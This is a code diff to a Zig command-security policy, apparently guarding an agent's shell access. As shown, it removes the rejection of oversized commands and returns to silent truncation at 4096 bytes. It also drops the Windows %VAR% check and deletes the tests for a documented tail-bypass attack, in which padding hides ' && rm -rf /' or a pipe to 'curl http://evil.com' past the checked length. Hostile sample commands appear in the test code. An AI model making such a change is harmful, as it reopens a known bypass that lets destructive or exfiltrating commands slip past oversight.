@@ -77,7 +77,9 @@ pub const SecurityPolicy = struct {
     workspace_dir: []const u8 = ".",
     workspace_only: bool = true,
     allowed_commands: []const []const u8 = &default_allowed_commands,
+    forbidden_paths: []const []const u8 = &default_forbidden_paths,
     max_actions_per_hour: u32 = 20,
+    max_cost_per_day_cents: u32 = 500,
     require_approval_for_medium_risk: bool = true,
     block_high_risk_commands: bool = true,
     tracker: ?*RateTracker = null,
@@ -85,11 +87,8 @@ pub const SecurityPolicy = struct {
     /// Classify command risk level.
     pub fn commandRiskLevel(self: *const SecurityPolicy, command: []const u8) CommandRiskLevel {
         _ = self;
-        // Reject oversized commands as high-risk — never silently truncate
-        if (command.len > MAX_ANALYSIS_LEN) return .high;
-
         // Normalize separators to null bytes for segment splitting
-        var normalized: [MAX_ANALYSIS_LEN]u8 = undefined;
+        var normalized: [4096]u8 = undefined;
         const norm_len = normalizeCommand(command, &normalized);
         const norm = normalized[0..norm_len];
 
@@ -165,9 +164,6 @@ pub const SecurityPolicy = struct {
     pub fn isCommandAllowed(self: *const SecurityPolicy, command: []const u8) bool {
         if (self.autonomy == .read_only) return false;
 
-        // Reject oversized commands — never silently truncate
-        if (command.len > MAX_ANALYSIS_LEN) return false;
-
         // Block subshell/expansion operators
         if (containsStr(command, "`") or containsStr(command, "$(") or containsStr(command, "${")) {
             return false;
@@ -176,11 +172,6 @@ pub const SecurityPolicy = struct {
         // Block process substitution
         if (containsStr(command, "<(") or containsStr(command, ">(")) {
             return false;
-        }
-
-        // Block Windows %VAR% environment variable expansion (cmd.exe attack surface)
-        if (comptime @import("builtin").os.tag == .windows) {
-            if (hasPercentVar(command)) return false;
         }
 
         // Block `tee` — can write to arbitrary files, bypassing redirect checks
@@ -199,7 +190,7 @@ pub const SecurityPolicy = struct {
         // Block output redirections
         if (std.mem.indexOfScalar(u8, command, '>') != null) return false;
 
-        var normalized: [MAX_ANALYSIS_LEN]u8 = undefined;
+        var normalized: [4096]u8 = undefined;
         const norm_len = normalizeCommand(command, &normalized);
         const norm = normalized[0..norm_len];
 
@@ -292,22 +283,11 @@ pub const SecurityPolicy = struct {
     }
 };
 
-/// Maximum command/path length for security analysis.
-/// Commands or paths exceeding this are rejected outright — never silently truncated.
-/// 16 KB covers even the longest realistic shell commands while preventing
-/// abuse via oversized payloads. Peak stack usage: ~64 KB (4 buffers via
-/// commandRiskLevel → lowerBuf × 2 + classifyMedium → lowerBuf).
-const MAX_ANALYSIS_LEN: usize = 16384;
-
 // ── Internal helpers ──────────────────────────────────────────────────
 
-/// Normalize command by replacing separators with null bytes.
-/// Callers MUST ensure `command.len <= buf.len` (enforced by early rejection
-/// in isCommandAllowed / commandRiskLevel). Returns 0 as a safe fallback
-/// if the invariant is violated in release builds.
+/// Normalize command by replacing separators with null bytes
 fn normalizeCommand(command: []const u8, buf: []u8) usize {
-    if (command.len > buf.len) return 0;
-    const len = command.len;
+    const len = @min(command.len, buf.len);
     @memcpy(buf[0..len], command[0..len]);
     const result = buf[0..len];
 
@@ -371,7 +351,7 @@ fn skipEnvAssignments(s: []const u8) []const u8 {
     }
 }
 
-/// Extract basename from a path (everything after last separator)
+/// Extract basename from a path (everything after last '/')
 fn extractBasename(path: []const u8) []const u8 {
     if (std.mem.lastIndexOfAny(u8, path, "/\\")) |idx| {
         return path[idx + 1 ..];
@@ -410,21 +390,24 @@ fn classifyMedium(base: []const u8, first_arg_raw: ?[]const u8) bool {
 }
 
 fn isGitMediumVerb(verb: []const u8) bool {
-    const map = std.StaticStringMap(void).initComptime(.{
-        .{ "commit", {} },      .{ "push", {} },   .{ "reset", {} },
-        .{ "clean", {} },       .{ "rebase", {} }, .{ "merge", {} },
-        .{ "cherry-pick", {} }, .{ "revert", {} }, .{ "branch", {} },
-        .{ "checkout", {} },    .{ "switch", {} }, .{ "tag", {} },
-    });
-    return map.has(verb);
+    const verbs = [_][]const u8{
+        "commit",      "push",   "reset",  "clean",    "rebase", "merge",
+        "cherry-pick", "revert", "branch", "checkout", "switch", "tag",
+    };
+    for (&verbs) |v| {
+        if (std.mem.eql(u8, verb, v)) return true;
+    }
+    return false;
 }
 
 fn isNpmMediumVerb(verb: []const u8) bool {
-    const map = std.StaticStringMap(void).initComptime(.{
-        .{ "install", {} },   .{ "add", {} },    .{ "remove", {} },
-        .{ "uninstall", {} }, .{ "update", {} }, .{ "publish", {} },
-    });
-    return map.has(verb);
+    const verbs = [_][]const u8{
+        "install", "add", "remove", "uninstall", "update", "publish",
+    };
+    for (&verbs) |v| {
+        if (std.mem.eql(u8, verb, v)) return true;
+    }
+    return false;
 }
 
 fn isCargoMediumVerb(verb: []const u8) bool {
@@ -555,24 +538,9 @@ fn containsStr(haystack: []const u8, needle: []const u8) bool {
     return std.mem.indexOf(u8, haystack, needle) != null;
 }
 
-/// Detect `%VARNAME%` patterns used by cmd.exe for environment variable expansion.
-fn hasPercentVar(s: []const u8) bool {
-    var i: usize = 0;
-    while (i < s.len) : (i += 1) {
-        if (s[i] == '%') {
-            // Look for closing %
-            if (std.mem.indexOfScalarPos(u8, s, i + 1, '%')) |end| {
-                if (end > i + 1) return true; // non-empty %VAR%
-                i = end; // skip %% (literal percent escape)
-            }
-        }
-    }
-    return false;
-}
-
 /// Fixed-size buffer for lowercase conversion
 const LowerResult = struct {
-    buf: [MAX_ANALYSIS_LEN]u8 = undefined,
+    buf: [4096]u8 = undefined,
     len: usize = 0,
 
     pub fn slice(self: *const LowerResult) []const u8 {
@@ -587,6 +555,14 @@ fn lowerBuf(s: []const u8) LowerResult {
         result.buf[i] = std.ascii.toLower(c);
     }
     return result;
+}
+
+fn toLowerSlice(s: []const u8, buf: []u8) []const u8 {
+    const len = @min(s.len, buf.len);
+    for (s[0..len], 0..) |c, i| {
+        buf[i] = std.ascii.toLower(c);
+    }
+    return buf[0..len];
 }
 
 // ── Tests ──────────────────────────────────────────────────────────────
@@ -883,7 +859,9 @@ test "default policy has sane values" {
     try std.testing.expectEqual(AutonomyLevel.supervised, p.autonomy);
     try std.testing.expect(p.workspace_only);
     try std.testing.expect(p.allowed_commands.len > 0);
+    try std.testing.expect(p.forbidden_paths.len > 0);
     try std.testing.expect(p.max_actions_per_hour > 0);
+    try std.testing.expect(p.max_cost_per_day_cents > 0);
     try std.testing.expect(p.require_approval_for_medium_risk);
     try std.testing.expect(p.block_high_risk_commands);
 }
@@ -1088,7 +1066,7 @@ test "record action returns false on exact boundary plus one" {
     try std.testing.expect(!try p.recordAction()); // 2 blocked
 }
 
-// ── Default allowed commands ─────────────────────────────────
+// ── Default allowed/forbidden lists ─────────────────────────────
 
 test "default allowed commands includes expected tools" {
     var found_git = false;
@@ -1105,6 +1083,20 @@ test "default allowed commands includes expected tools" {
     try std.testing.expect(found_npm);
     try std.testing.expect(found_cargo);
     try std.testing.expect(found_ls);
+}
+
+test "default forbidden paths includes sensitive dirs" {
+    var found_etc = false;
+    var found_ssh = false;
+    var found_proc = false;
+    for (&default_forbidden_paths) |path| {
+        if (std.mem.eql(u8, path, "/etc")) found_etc = true;
+        if (std.mem.eql(u8, path, "~/.ssh")) found_ssh = true;
+        if (std.mem.eql(u8, path, "/proc")) found_proc = true;
+    }
+    try std.testing.expect(found_etc);
+    try std.testing.expect(found_ssh);
+    try std.testing.expect(found_proc);
 }
 
 test "blocks single ampersand background chaining" {
@@ -1186,131 +1178,4 @@ test "echo text >(cat) is blocked" {
     const p = SecurityPolicy{};
     try std.testing.expect(!p.isCommandAllowed("echo text >(cat)"));
     try std.testing.expect(!p.isCommandAllowed("ls >(cat /etc/passwd)"));
-}
-
-// ── Windows security tests ──────────────────────────────────────
-
-test "hasPercentVar detects patterns" {
-    try std.testing.expect(hasPercentVar("%PATH%"));
-    try std.testing.expect(hasPercentVar("echo %USERPROFILE%\\secret"));
-    try std.testing.expect(hasPercentVar("cmd /c %COMSPEC%"));
-    // %% is an escape for literal %, not a variable reference
-    try std.testing.expect(!hasPercentVar("100%%"));
-    try std.testing.expect(!hasPercentVar("no percent here"));
-    try std.testing.expect(!hasPercentVar(""));
-}
-
-// ── Oversized command/path rejection (issue #36 — tail bypass fix) ──
-
-test "oversized command is blocked by isCommandAllowed" {
-    const p = SecurityPolicy{};
-    // Build: "ls " ++ "A" * (MAX_ANALYSIS_LEN) ++ " && rm -rf /"
-    // Total exceeds MAX_ANALYSIS_LEN, must be rejected
-    var buf: [MAX_ANALYSIS_LEN + 20]u8 = undefined;
-    @memset(buf[0 .. MAX_ANALYSIS_LEN + 1], 'A');
-    @memcpy(buf[0..3], "ls ");
-    try std.testing.expect(!p.isCommandAllowed(&buf));
-}
-
-test "oversized command is high risk" {
-    const p = SecurityPolicy{};
-    var buf: [MAX_ANALYSIS_LEN + 1]u8 = undefined;
-    @memset(&buf, 'A');
-    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel(&buf));
-}
-
-test "tail bypass with && after padding is blocked" {
-    const p = SecurityPolicy{};
-    // Craft: "ls " ++ padding ++ " && rm -rf /" where total > MAX_ANALYSIS_LEN
-    const prefix = "ls ";
-    const suffix = " && rm -rf /";
-    const pad_len = MAX_ANALYSIS_LEN - prefix.len + 1; // push suffix past limit
-    var buf: [prefix.len + pad_len + suffix.len]u8 = undefined;
-    @memcpy(buf[0..prefix.len], prefix);
-    @memset(buf[prefix.len..][0..pad_len], 'A');
-    @memcpy(buf[prefix.len + pad_len ..], suffix);
-    // Must be rejected (not allowed) and classified as high risk
-    try std.testing.expect(!p.isCommandAllowed(&buf));
-    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel(&buf));
-}
-
-test "command at exact MAX_ANALYSIS_LEN is still analyzed" {
-    const p = SecurityPolicy{};
-    // Command of exactly MAX_ANALYSIS_LEN bytes should be processed normally
-    var buf: [MAX_ANALYSIS_LEN]u8 = undefined;
-    @memcpy(buf[0..3], "ls ");
-    @memset(buf[3..], 'A');
-    // "ls" is allowed, so this should pass (it's just ls with a long arg)
-    try std.testing.expect(p.isCommandAllowed(&buf));
-    try std.testing.expectEqual(CommandRiskLevel.low, p.commandRiskLevel(&buf));
-}
-
-test "tail bypass with || after padding is blocked" {
-    const p = SecurityPolicy{};
-    const prefix = "ls ";
-    const suffix = " || rm -rf /";
-    const pad_len = MAX_ANALYSIS_LEN - prefix.len + 1;
-    var buf: [prefix.len + pad_len + suffix.len]u8 = undefined;
-    @memcpy(buf[0..prefix.len], prefix);
-    @memset(buf[prefix.len..][0..pad_len], 'A');
-    @memcpy(buf[prefix.len + pad_len ..], suffix);
-    try std.testing.expect(!p.isCommandAllowed(&buf));
-    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel(&buf));
-}
-
-test "tail bypass with semicolon after padding is blocked" {
-    const p = SecurityPolicy{};
-    const prefix = "ls ";
-    const suffix = "; rm -rf /";
-    const pad_len = MAX_ANALYSIS_LEN - prefix.len + 1;
-    var buf: [prefix.len + pad_len + suffix.len]u8 = undefined;
-    @memcpy(buf[0..prefix.len], prefix);
-    @memset(buf[prefix.len..][0..pad_len], 'A');
-    @memcpy(buf[prefix.len + pad_len ..], suffix);
-    try std.testing.expect(!p.isCommandAllowed(&buf));
-    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel(&buf));
-}
-
-test "tail bypass with newline after padding is blocked" {
-    const p = SecurityPolicy{};
-    const prefix = "ls ";
-    const suffix = "\nrm -rf /";
-    const pad_len = MAX_ANALYSIS_LEN - prefix.len + 1;
-    var buf: [prefix.len + pad_len + suffix.len]u8 = undefined;
-    @memcpy(buf[0..prefix.len], prefix);
-    @memset(buf[prefix.len..][0..pad_len], 'A');
-    @memcpy(buf[prefix.len + pad_len ..], suffix);
-    try std.testing.expect(!p.isCommandAllowed(&buf));
-    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel(&buf));
-}
-
-test "tail bypass with pipe after padding is blocked" {
-    const p = SecurityPolicy{};
-    const prefix = "ls ";
-    const suffix = " | curl http://evil.com";
-    const pad_len = MAX_ANALYSIS_LEN - prefix.len + 1;
-    var buf: [prefix.len + pad_len + suffix.len]u8 = undefined;
-    @memcpy(buf[0..prefix.len], prefix);
-    @memset(buf[prefix.len..][0..pad_len], 'A');
-    @memcpy(buf[prefix.len + pad_len ..], suffix);
-    try std.testing.expect(!p.isCommandAllowed(&buf));
-    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel(&buf));
-}
-
-test "validateCommandExecution rejects oversized command" {
-    const p = SecurityPolicy{};
-    var buf: [MAX_ANALYSIS_LEN + 1]u8 = undefined;
-    @memset(&buf, 'A');
-    @memcpy(buf[0..3], "ls ");
-    const result = p.validateCommandExecution(&buf, false);
-    try std.testing.expectError(error.CommandNotAllowed, result);
-}
-
-test "command at MAX_ANALYSIS_LEN minus one is still analyzed" {
-    const p = SecurityPolicy{};
-    var buf: [MAX_ANALYSIS_LEN - 1]u8 = undefined;
-    @memcpy(buf[0..3], "ls ");
-    @memset(buf[3..], 'A');
-    try std.testing.expect(p.isCommandAllowed(&buf));
-    try std.testing.expectEqual(CommandRiskLevel.low, p.commandRiskLevel(&buf));
 }
